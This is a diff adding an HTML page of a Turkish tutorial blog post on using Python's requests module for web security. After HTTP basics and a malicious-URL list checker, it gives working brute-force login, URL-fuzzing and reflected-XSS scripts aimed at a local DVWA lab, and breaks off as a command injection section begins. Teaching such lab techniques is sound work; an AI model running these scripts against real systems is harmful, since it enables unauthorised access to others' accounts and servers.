@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  Hakerlar için Python: requests · Yusuf Talha ARABACI
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Yusuf Talha ARABACI">
+<meta name="description" content="
+
+  Hakerlar için Python: requests
+  
+    
+    Başlık Linki
+  
+
+
+
+  Giriş
+  
+    
+    Başlık Linki
+  
+
+Merhaba, bu yazımızda web uygulama güvenliği alanında araçlar yazabileceğimiz python’un requests modülünü tanıyacağız.
+
+  requests nedir?
+  
+    
+    Başlık Linki
+  
+
+requests python’un basit ama zarif bir HTTP modulüdür. HTTP isteklerini son derece kolay bir şekilde göndermenizi sağlar. GET metodu ile yapılan isteklerde URL’lerinize manuel olarak sorgu dizeleri eklemenize veya POST verilerinizi biçimsel olarak kodlamanıza gerek yoktur, requests modülü bu işleri sizin için halleder. Bu yazımızda requests ile çeşitli web toolları yazacağız ama önce kuruluma bir göz atalım. Python dilini temel olarak bildiğinizi varsayıp devam ediyoruz. Eğer isterseniz sitemizdeki python ile ilgili yazılara da bakabilirsiniz.">
+<meta name="keywords" content="cybersecurity, infosec, cloud-native security, soc architecture, open source defense, yusuf talha arabaci, malware analysis, pentesting">
+
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/images/profile.jpeg">
+  <meta name="twitter:title" content="Hakerlar için Python: requests">
+  <meta name="twitter:description" content="Hakerlar için Python: requestsBaşlık LinkiGirişBaşlık LinkiMerhaba, bu yazımızda web uygulama güvenliği alanında araçlar yazabileceğimiz python’un requests modülünü tanıyacağız.
+requests nedir?Başlık Linkirequests python’un basit ama zarif bir HTTP modulüdür. HTTP isteklerini son derece kolay bir şekilde göndermenizi sağlar. GET metodu ile yapılan isteklerde URL’lerinize manuel olarak sorgu dizeleri eklemenize veya POST verilerinizi biçimsel olarak kodlamanıza gerek yoktur, requests modülü bu işleri sizin için halleder. Bu yazımızda requests ile çeşitli web toolları yazacağız ama önce kuruluma bir göz atalım. Python dilini temel olarak bildiğinizi varsayıp devam ediyoruz. Eğer isterseniz sitemizdeki python ile ilgili yazılara da bakabilirsiniz.">
+
+<meta property="og:url" content="http://localhost:1313/tr/posts/2022/08/hakerlar-i%C3%A7in-python-requests/">
+  <meta property="og:site_name" content="Yusuf Talha ARABACI">
+  <meta property="og:title" content="Hakerlar için Python: requests">
+  <meta property="og:description" content="Hakerlar için Python: requestsBaşlık LinkiGirişBaşlık LinkiMerhaba, bu yazımızda web uygulama güvenliği alanında araçlar yazabileceğimiz python’un requests modülünü tanıyacağız.
+requests nedir?Başlık Linkirequests python’un basit ama zarif bir HTTP modulüdür. HTTP isteklerini son derece kolay bir şekilde göndermenizi sağlar. GET metodu ile yapılan isteklerde URL’lerinize manuel olarak sorgu dizeleri eklemenize veya POST verilerinizi biçimsel olarak kodlamanıza gerek yoktur, requests modülü bu işleri sizin için halleder. Bu yazımızda requests ile çeşitli web toolları yazacağız ama önce kuruluma bir göz atalım. Python dilini temel olarak bildiğinizi varsayıp devam ediyoruz. Eğer isterseniz sitemizdeki python ile ilgili yazılara da bakabilirsiniz.">
+  <meta property="og:locale" content="tr">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-08-26T00:00:00+00:00">
+    <meta property="article:modified_time" content="2022-08-26T00:00:00+00:00">
+    <meta property="og:image" content="http://localhost:1313/images/profile.jpeg">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/tr/posts/2022/08/hakerlar-i%C3%A7in-python-requests/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+  
+    
+    <link rel="stylesheet" href="/css/custom.css" media="screen">
+  
+
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/tr/">
+      Yusuf Talha ARABACI
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tr/posts/">Yazılar</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tr/series/">Seriler</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tr/about/">Hakkımda</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>|</span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="/posts/2022/08/python-for-hackers-requests/">English</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/tr/posts/2022/08/hakerlar-i%C3%A7in-python-requests/">
+              Hakerlar için Python: requests
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2022-08-26T00:00:00Z">
+                Ağustos 26, 2022
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              9 dakikalık okuma
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      
+
+
+      <div class="post-content">
+        
+        <hr>
+<h3 id="hakerlar-için-pythonrequests">
+  Hakerlar için Python: requests
+  <a class="heading-link" href="#hakerlar-i%c3%a7in-pythonrequests">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p><img src="/images/1_a87phGSd-sbfiJLWPfGMxA.png" alt=""></p>
+<h3 id="giriş">
+  Giriş
+  <a class="heading-link" href="#giri%c5%9f">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>Merhaba, bu yazımızda web uygulama güvenliği alanında araçlar yazabileceğimiz python’un <em>requests</em> modülünü tanıyacağız.</p>
+<h3 id="requests-nedir">
+  requests nedir?
+  <a class="heading-link" href="#requests-nedir">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p><a href="https://requests.readthedocs.io/"  class="external-link" target="_blank" rel="noopener">requests</a> python’un basit ama zarif bir HTTP modulüdür. HTTP isteklerini son derece kolay bir şekilde göndermenizi sağlar. GET metodu ile yapılan isteklerde URL’lerinize manuel olarak sorgu dizeleri eklemenize veya POST verilerinizi biçimsel olarak kodlamanıza gerek yoktur, requests modülü bu işleri sizin için halleder. Bu yazımızda <em>requests</em> ile çeşitli web toolları yazacağız ama önce kuruluma bir göz atalım. Python dilini temel olarak bildiğinizi varsayıp devam ediyoruz. Eğer isterseniz sitemizdeki python ile ilgili <a href="https://pwnlab.me/intermediate-python-articles/"  class="external-link" target="_blank" rel="noopener">yazılara</a> da bakabilirsiniz.</p>
+<h3 id="kurulum">
+  Kurulum
+  <a class="heading-link" href="#kurulum">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>request modülünü kurmak için terminal ekranınıza aşağıdaki komutu yazabilirsiniz.</p>
+<pre tabindex="0"><code>python -m pip install requests
+</code></pre><p>kurulum tamamlandıktan sonra bir python dosyası oluşturup aşağıdaki kodu yazıp çalıştırdığınızda bir hata almıyorsanız, kurulumunuz başarılı demektir.</p>
+<pre tabindex="0"><code>import requests
+</code></pre><p>şimdi bu modülün yapısını biraz irdeleyelim.</p>
+<h4 id="metotlar">
+  Metotlar
+  <a class="heading-link" href="#metotlar">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>request modülünün birçok metodu olsa da bizim için önemli olan GET ve POST isteklerini yaptığımız metotlardır. Bunların ne olduğunu bilmiyorsanız <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods"  class="external-link" target="_blank" rel="noopener">HTTP request</a> metotlarını araştırabilirsiniz.</p>
+<p>**get()**En çok kullandığımız istek türü GET isteğidir. Tarayıcımızda herhangi bir web sayfasına girdiğimizde aslında GET isteği atmış oluruz. Bir URL adresine GET isteği attığımzda bize sayfanın HTML dökümünü(sayfa kaynağını) döndürür, tarayıcımız bu HTML’i yorumlayarak bize sayfayı gösterir. (sadece HTML değil beraberinde CSS ve Javascript kodları da geliyor ama onlarla işimiz yok) <em>requests.get()</em> metodu ile GET istekleri yapabiliriz. Kullanımı temel olarak aşağıdaki gibidir: <em>get(url, params, args)</em></p>
+<p>**post()**POST metodu genellikle <a href="https://www.w3schools.com/html/html_forms.asp"  class="external-link" target="_blank" rel="noopener">HTML formlarını</a> gönderirken(submit) kullanılan metottur. Giriş ve kayıt sayfalarında bu metot kullanılır. Yani bir giriş sayfasına kaba kuvvet saldırısı yapmak için bu metodu kullanacağız. GET metodundan farklı olarak bu metodla gönderdiğimiz parametreler/veri URL’e eklenmez. POST istekleri göndermek için <em>requests.post()</em> metodu kullanılır. Kullanımı temel olarak aşağıdaki gibidir. <em>post(url, data, json, args)</em></p>
+<h4 id="parametreler">
+  Parametreler
+  <a class="heading-link" href="#parametreler">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p><strong>url</strong>GET veya POST isteğini göndereceğimiz web sayfasının adresidir.</p>
+<p><strong>params, data, json, files</strong>Bu parametreler GET veya POST isteğiyle göndereceğimiz parametreler/veridir. <em>params</em> get() metodunda diğerleri ise post() metodunda kullanılır. Bu metodların kullanımı hedef siteye bağlıdır eğer hedef site bir parametre değeri almıyorsa kullanımına gerek yoktur. Eğer parametre alıyorsa, yani bir HTML formu varsa, <em>name</em> etiket değerlerine istenilen verileri göndermemiz gerekir.</p>
+<p><em><strong>params</strong></em>*:* get() metodunda <em>tuple</em> yapısında parametre/veri alır. <br>
+<strong>data:</strong> post() metodunda <em>tuple</em> yapısında parametre/veri alır. <br>
+<em><strong>json</strong></em>*:* post() metodunda <em>json</em> yapısında parametre/veri alır. <br>
+<em><strong>files</strong></em>*:* post() metodunda XML veya farklı dosya türlerinde parametre/veri alır. GET isteğinde parametreler yani veri URL’in devamına eklenir. Bu yüzden direk URL’i düzenleyerek parametreleri ekleyebiliriz ya da get() metodunun <em>params</em> parametresine <em>dictionary</em> yapısında verileri verebiliriz. Bunun için:</p>
+<pre tabindex="0"><code>params = {&#39;key1&#39;: &#39;value1&#39;, &#39;key2&#39;: &#39;value2&#39;}
+</code></pre><p>şeklinde sözlük(dictionary) yapısında parametreleri tanımlarız. Bu parametreler ile bir istek yaptığımızda parametrelerin aşağıdaki şekilde URL’in sonuna eklenir.</p>
+<pre tabindex="0"><code>https://httpbin.org/get?key2=value2&amp;key1=value1
+</code></pre><p>şimdi küçük bir python kodu yazarak GET isteği gönderelim.</p>
+<pre tabindex="0"><code>import requests  
+params = {&#39;key1&#39;: &#39;value1&#39;, &#39;key2&#39;: &#39;value2&#39;}  
+response = requests.get(&#39;https://httpbin.org/get&#39;, params=params)
+</code></pre><p>POST isteğiyle veri göndermenin farklı yolları vardır. GET isteğinde olduğu gibi sözlük yapısında veya json yapısında veri gönderilebilir: sözlük yapısında veri göndermek için:</p>
+<pre tabindex="0"><code>data = {&#39;key1&#39;: &#39;value1&#39;, &#39;key2&#39;: &#39;value2&#39;}
+</code></pre><p>json yapısında veri göndermek için <a href="https://docs.python.org/3/library/json.html"  class="external-link" target="_blank" rel="noopener">json</a> modülünü kullanabilirsiniz.</p>
+<h4 id="args">
+  <strong>args</strong>
+  <a class="heading-link" href="#args">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>argümanlar get() ve post() metotları için aynıdır ve kullanımları isteğe bağlıdır, kullanılmadığı taktirde varsayılan değerleri ile yürütülür.</p>
+<p><em><strong>allow_redirects(bool)</strong></em><br>
+Yeniden yönlendirmeyi etkinleştirmek/devre dışı bırakmak için TRUE/FALSE değeri alır. Varsayılan olarak TRUE’dur. Yani yönlendirmelere izin verir.<br>
+<em><strong>auth(tuple)</strong></em><br>
+Belirli bir HTTP kimlik doğrulamasını etkinleştirmek için kullanılır. Varsayılan olarak NULL değeri alır, kimlik doğrulaması yapmaz <br>
+<em><strong>cert(tuple)</strong></em><br>
+Bir sertifika dosyasıni <em>tuple</em> yapısında alır. Varsayılan olarak NULL değeri alır.<br>
+<em><strong>cookies(dict)</strong></em><br>
+Belirtilen url’ye gönderilecek çerez sözlüğünü alır. Varsayılan olarak çerez göndermez. <br>
+<em><strong>headers(dict)</strong></em><br>
+Belirtilen url’ye gönderilecek HTTP headerını alır. Varsayılan olarak header göndermez. <br>
+<em><strong>proxies(dict)</strong></em><br>
+Proxy URL’sine gönderilecek protokol’ü alır. Varsayılan olarak NULL değeri alır. <br>
+<em><strong>stream(bool)</strong></em> Yanıtın hemen indirilmesi (FALSE) veya akışa alınması (TRUE) ‘değeri ile belirlenir. Varsayılan olarak FALSE değerini alır yani yanıt hemen indirilir. <br>
+<em><strong>timeout(int)</strong></em> İstemcinin bağlantı kurması ve/veya yanıt göndermesi için kaç saniye bekleneceğini gösteren timeout süresini alır. Varsayılan olarak NULL değer alır, bu, isteğin bağlantı kapatılana kadar devam edeceği anlamına gelir <br>
+<em><strong>verify(bool)</strong></em><br>
+Sunucuların TLS sertifikasını doğrulamak için TRUE doğrulamayı kapatmak için FALSE değer alır. Varsayılan olarak TRUE değerdedir.</p>
+<h4 id="response">
+  response
+  <a class="heading-link" href="#response">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h4>
+<p>Sunucunun gönderdiğimiz isteğe döndüğü yanıttır. Yazdığımız python kodlarında <em>get()</em> metodu ile aldığımız cevabı <em>response</em> isimli bir değişkende tutmuştuk. Şimdi bu cevabın içeriğini irdeleyelim.</p>
+<pre tabindex="0"><code>print(response.text)
+</code></pre><p>ile response’in içeriğini text olarak yadırabiliriz. Karşımıza aşağıdaki gibi bir metin çıkacaktır.</p>
+<pre tabindex="0"><code>{  
+&#34;args&#34;: {  
+&#34;key1&#34;: &#34;value1&#34;,   
+&#34;key2&#34;: &#34;value2&#34;  
+},   
+&#34;headers&#34;: {  
+&#34;Accept&#34;: &#34;*/*&#34;,   
+&#34;Accept-Encoding&#34;: &#34;gzip, deflate&#34;,   
+&#34;Host&#34;: &#34;httpbin.org&#34;,   
+&#34;User-Agent&#34;: &#34;python-requests/2.28.1&#34;,   
+&#34;X-Amzn-Trace-Id&#34;: &#34;Root=1-62e23811-6a7c14dc2c3bc62026eebb0c&#34;  
+},   
+&#34;origin&#34;: &#34;185.51.36.100&#34;,   
+&#34;url&#34;: &#34;https://httpbin.org/get?key1=value1&amp;key2=value2&#34;  
+}
+</code></pre><p>Burada aldığımız cevap ile ilgili bilgiler görüyoruz. Ayrıca aldığımız response’un tipine bakalım.</p>
+<pre tabindex="0"><code>&gt;&gt;print(type(response))
+</code></pre><pre tabindex="0"><code>&lt;class &#39;requests.models.Response&#39;&gt;
+</code></pre><p>requests.models.Response türünde bir nesne olduğunu anlıyoruz. <a href="https://requests.readthedocs.io/en/latest/_modules/requests/models/"  class="external-link" target="_blank" rel="noopener">Kaynak koduna</a> baktığımzda:</p>
+<p><img src="/images/0_L_iXdDv3gSm2uu6j.png" alt=""></p>
+<p>uzunca bir kod görüyoruz. Kendi dökümantasyonuna da <a href="https://requests.readthedocs.io/en/latest/api/#requests.Response"  class="external-link" target="_blank" rel="noopener">buradan</a> ulaşabilirsiniz. Bizim için burada önemli olan __attrs__ kısmında yazan attiributeleridir.</p>
+<pre tabindex="0"><code>print(response.__attrs__)
+</code></pre><pre tabindex="0"><code>[&#39;_content&#39;, &#39;status_code&#39;, &#39;headers&#39;, &#39;url&#39;, &#39;history&#39;, &#39;encoding&#39;, &#39;reason&#39;, &#39;cookies&#39;, &#39;elapsed&#39;, &#39;request&#39;]
+</code></pre><p>Ayrıca yukarıdaki kod ile de bu attiributeleri görebiliriz. Bu attiributeler ile <em>response.text</em> aldığımız metinde yazan değerlere ulaşabiliriz ama burda bizim için önemli olan <em>content</em> ‘tir.</p>
+<pre tabindex="0"><code>print(response.content)
+</code></pre><p>bize sayfa kaynağını döndürecektir. Şimdi verilen websitesinin adresini alan ve kaynağını bir html dosyasına kaydeden bir uygulama yapalım.</p>
+<pre tabindex="0"><code>import requests
+</code></pre><pre tabindex="0"><code>response = requests.get(&#39;https://www.google.com.tr&#39;)  
+f = open(&#34;source.html&#34;,&#34;w&#34;)  
+f.write(str(response.content))  
+f.close()
+</code></pre><p>sayfa kaynağının aşağıdaki gibi çekildiğini görebilirsiniz. (CSS ve Javascript kodlarıyla birlikte)</p>
+<p><img src="/images/0_W3QQk0ZEoY20GPcY.png" alt=""></p>
+<p>Sayfa kaynağını <a href="https://pypi.org/project/beautifulsoup4/"  class="external-link" target="_blank" rel="noopener">BeautifulSoup</a> modülü ile ayrıştırabilir içinden istedğiniz bilgileri alabilirsiniz. Ama bu yazımızda daha farklı şeyler yapacağız.</p>
+<h3 id="usomdan-zararlı-web-sitelerini-çekme">
+  Usomdan zararlı web sitelerini çekme
+  <a class="heading-link" href="#usomdan-zararl%c4%b1-web-sitelerini-%c3%a7ekme">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p><a href="https://www.usom.gov.tr/"  class="external-link" target="_blank" rel="noopener">USOM</a>(Ulusal Sİber Olaylara Müdahale Merkezi) ülkemizde ki siber olaylara karşı 7/24 çalışma esasında göre faaliyet gösteren bir oluşumdur. İnternetteki zararllı siteleri indekslediği bir listesi bulunmaktadır. Bu listeye <a href="http://www.usom.gov.tr/url-list.txt"  class="external-link" target="_blank" rel="noopener">buradan</a> ulaşabilirsiniz. Şimdi python ile bu listeyi çekmeye çalışalım.</p>
+<pre tabindex="0"><code>import requests  
+response = requests.get(&#34;http://www.usom.gov.tr/url-list.txt&#34;, verify=False)  
+with open(&#34;usom.txt&#34;, &#34;wb&#34;) as binary_file:  
+  binary_file.write(response.content)
+</code></pre><p>Basit bir GET isteği ile bu listeyi çekebildik. Şimdi elimizde olan bir URL’in bu listede yer alıp almadığını kontrol eden bir fonksiyon yazalım.</p>
+<pre tabindex="0"><code>def check(url):  
+  f = open(&#34;usom.txt&#34;)  
+  lines = f.read()  
+  lines =lines.split(&#39;\n&#39;)  
+  for line in lines:  
+    if line == url:  
+    text = url+&#34; zararlıdır&#34;  
+    return text
+</code></pre><pre tabindex="0"><code>  text = url+&#34; zararlı değildir.&#34;  
+  return text
+</code></pre><p>Fonksiyona verdiğimiz URL’i aldığımız metin dosyasında arayarak bulduğu takride bize zararlı olduğunu bulamadığı taktirde zararsız olduğunu döndüren bir uygulama yapmış olduk.</p>
+<h3 id="kaba-kuvvet-saldırısı">
+  Kaba Kuvvet Saldırısı
+  <a class="heading-link" href="#kaba-kuvvet-sald%c4%b1r%c4%b1s%c4%b1">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>Kaba Kuvvet Saldırısı, doğrusunu bulma umuduyla deneme yanılma yönetimi kullanarak bir web sayfasına giriş yapmak için kullanabileceğimiz basit ancak hala etkili bir saldırı türüdür. Bunu python uygulamamızla nasıl yapabileceğimize bir bakalım. Bunun için DVWA uygulamasını kullanacağım.</p>
+<p><img src="/images/0_D7cpaI2bY2tgv3Ig.png" alt=""></p>
+<p>Burada giriş sayfamı <a href="https://portswigger.net/burp"  class="external-link" target="_blank" rel="noopener">burp suite</a> aracıyla dinledim. username ve password alanlarına ‘aa’ değerini girerek login butonuna bastım. Yapılan GET isteği burp aracım üzerinde HTTP History bölümünde yakalanmış oldu. Tabi bunun için faklı araçlar da kullanabilirsiniz. Biz buradaki bazı bilgileri kullanacağız. Öncellikle DVWA sayfasına oturum açarak eriştiğimiz için python uygulamamızında bir şekilde oturuma erişmesi gerekiyor. Peki oturum nedir? kısaca bahsedecek olursak, bir giriş sayfasından kullanıcı adı/şifre bilgilerimizle giriş yaptığımızda aslında bir oturum başlatmış oluruz. İşimiz bitip tarayıcımızı kapattığımızda veya üzerinden belli bir süre geçtiğinde oturum sonlandırılır. Web uygulamaları oturum oluştururken çerelerden(cookie) yararlanır, bir çerez istemci bilgisayarında bir çerez sunucuda olmak üzere iki çerez oluşturulur. Bu iki çerez de kaybolmadığı sürece oturum devam eder. Biz burada DVWA sayfasına giriş yaparak aldığımız oturum çerezini python uygulamamıza vererek bizim otururumuz ile web sayfasına erişmesini sağlayacağız. Burp aracında işaretli alan ‘PHPSESID’ bizim oturum çerezimizdir. Yalnız acele etsek iyi olur, oturumun süresi bitiyor…</p>
+<pre tabindex="0"><code>import requests
+</code></pre><pre tabindex="0"><code>header = {&#34;Cookie&#34;: &#34;security=low; PHPSESSID=2d9gb38rft9o87vv22vbtnlu91&#34;} #oturum çerezini header&#39;a veriyoruz.
+</code></pre><pre tabindex="0"><code>usernames = [&#34;admin&#34;, &#34;root&#34;, &#34;user&#34;, &#34;aa&#34;]       #denemelerde kullanacağımız kullanıcı adı listesi  
+passwords = [&#34;resu&#34;, &#34;password&#34;, &#34;toor&#34;, &#34;1234&#34;]  #denemelerde kullanacağımız şifre listesi
+</code></pre><pre tabindex="0"><code>for i in usernames:  
+  for j in passwords:  
+    url = f&#34;http://10.0.2.4/dvwa/vulnerabilities/brute/?username={i}&amp;password={j}&amp;Login=Login&#34;  
+    #Uygulamımız GET isteğiyle çalıştığı için username ve password bilgilerini URL&#39;e ekleyerek deneyebiliriz.  
+    result = requests.get(url=url, headers=header)  
+    if not &#34;Username and/or password incorrect&#34; in str(result.content):  
+      print(&#34;Username: &#34;, i)  
+      print(&#34;password: &#34;, j)  
+      print(&#34;Status code: &#34;,result.status_code)  
+      print(&#34;Length: &#34;, len(result.content))  
+      print(&#34;Username and Password is found&#34;)
+</code></pre><p><img src="/images/0_WFaG5gXYv4_u5frj.png" alt=""></p>
+<p>Kodu python dosyasına yazıp çalıştırdığımızda canlıdaki DVWA sunucusuna GET istekleri göndererek denemeler yapacaktır.</p>
+<p>Ve evet saldırımız başarılı kullanıcı adı ve şifre bilgisini bulduk. Bu web sayfasında GET metodu kullanıldığı için saldırıyı URL üzerinde düzenleme yaparak kolayca gerçekleştirebildik. Eğer POST metodu kullanılmış olsaydı HTML formundaki <em>name</em> niteliklerinin isimlerine göre bir tuple oluşturup post() metodunun <em>data</em> parametresine verip saldırımızı gerçekleştirebilirdik. Bu kadar ipucu yeter, gerisi sizde…</p>
+<h3 id="url-fuzzing">
+  URL Fuzzing
+  <a class="heading-link" href="#url-fuzzing">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>URL Fuzzing işleminde olası dosya/dizin isimlerinin yer aldığı bir liste oluşturulur ve bununla sisteme http isteği attırılır. Bu sayede sunucu üzerindeki dizinler ve dosyalar bulunmaya çalışılır. Tabi bu işlemi manuel olarak tek tek deneyerek yapmak yorucudur. Bunun için küçük bir python kodu yazmaya ne dersiniz?</p>
+<pre tabindex="0"><code>import requests
+</code></pre><pre tabindex="0"><code>fuzzing_list = [&#39;/robots.txt&#39;,&#39;/etc/&#39;,&#39;/dvwa/&#39;,&#39;/passwd&#39;,&#39;/usr/&#39;,&#39;/index.php&#39;] #arama yapacağımız liste  
+header = {&#34;Cookie&#34;: &#34;security=low; PHPSESSID=0k6634cfi19e5sfn2vb754uns6&#34;} #dvwa üzerindeki oturum çerezimiz
+</code></pre><pre tabindex="0"><code>for i in fuzzing_list:  
+  url = &#34;http://10.0.2.4&#34;+str(i) #dvwa sunucusunun ip adresi devamına fuzzing denemeleri yapıyoruz  
+  result = requests.get(url = url, headers = header)  
+  if &#34;200&#34; in str(result.status_code):  
+    print(&#34;file or directory is found: &#34;,i)  
+  else:  
+    print(&#34;file or directory isn&#39;t found: &#34;,i)
+</code></pre><p>python kodunu çalıştırdığımızda listedeki dizin ve dosya adlarını deneyerek bize aşağıdaki sonucu verecektir.</p>
+<p><img src="/images/0_P0_DM5nuoLcNWX16.png" alt=""></p>
+<h3 id="xss-saldırısı">
+  XSS Saldırısı
+  <a class="heading-link" href="#xss-sald%c4%b1r%c4%b1s%c4%b1">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>XSS**,** temelinde web sayfası girdilerinden alınan değerlerin filtrelenmeden sayfa kaynağına dahil edilmesi sonucu ortaya çıkan bir güvenlik zafiyetidir. Bunun nedeni filtrelenmeyen girdilerden sayfaya zararlı javascript kodlarının dahil edilebilecek olmasıdır. Bu zafiyeti açığa çıkarabilecek birçok XSS scripti bulunmaktadır. Github üzerinde bulduğum bir listeye <a href="https://github.com/payloadbox/xss-payload-list"  class="external-link" target="_blank" rel="noopener">buradan</a> ulaşabilirsiniz. Bu uygulamamızda, XSS scriptlerini içeren bir listedeki değerleri sayfaya göndererek sayfa kaynağına eklenip eklenmediğini kontrol eden bir uygulama yapacağız. Bunun için bir önceki uygulamada yaptığımız oturum çerezini yine header değişkenine verdim, bu kısmı bir daha anlatmıyorum.</p>
+<p>DVWA sayfamız yine GET isteğiyle çalışıyor, bu yüzden <em>requests.get()</em> fonksiyonunu kullanacağız. Girdi bölümüne yazdıklarımız URL’de <em>name</em> bölümüne yazılıyor. Buradan hareketle biz de XSS scriptlerimizi <em>name</em> parametresine vereceğiz.</p>
+<pre tabindex="0"><code>import requests
+</code></pre><pre tabindex="0"><code>header = {&#34;Cookie&#34;: &#34;security=low; PHPSESSID=2d9gb38rft9o87vv22vbtnlu91&#34;}  
+xss_list = [&#34;&lt;h1&gt;xss&lt;/h1&gt;&#34;,&#34;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#34;,&#34;&lt;script&gt;prompt(&#39;xss&#39;)&lt;/script&gt;&#34;,&#34;XSS&#34;,&#34;alert(&#39;xss&#39;)&#34;]
+</code></pre><pre tabindex="0"><code>for payload in xss_list:  
+  url=&#34;http://10.0.2.4/dvwa/vulnerabilities/xss_r/?name=&#34;+payload #name parametresine scriptlerin verilmesi  
+  result = requests.get(url=url, headers=header) # GET isteğinin yapılması  
+  if str(payload) in str(result.content):  
+    print(&#34;Muhtemel XSS bulundu: &#34;+str(payload))
+</code></pre><p>Kodu python dosyasına yazıp çalıştırdığımızda canlıdaki DVWA sunucusuna GET istekleri göndererek denemeler yapacaktır.</p>
+<p><img src="/images/0_5GN1pw6l0XKQVsRQ.png" alt=""></p>
+<p>Aldığımız sonuca bakarsak, web sayfası filtreleme yaptığı için XSS scriptlerimiz çalışmadı. <h1>xss</h1> HTML injection scriptiydi, XSS ise düz bir stringden ibaret. Siz daha farklı XSS scriptleri deneyebilirsiniz.</p>
+<h3 id="command-injection-saldırısı">
+  Command Injection Saldırısı
+  <a class="heading-link" href="#command-injection-sald%c4%b1r%c4%b1s%c4%b1">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>Command injection,kod çalıştırma açıklığı olarak da bilinen bir zafiyet çeşididir. Girdiler filtrelenmeden sunucu shellinde çalıştırılması bu zafiyeti doğuruur. Saldırgan bu sayede istediği zararlı kodları sunucu shellinde çalıştırabilir. Uygulamamızda DVWA’nın command injection web sayfasını kullanacağız.</p>
+<p><img src="/images/0_Ik2wa2BdVo1Kxt3p.png" alt=""></p>
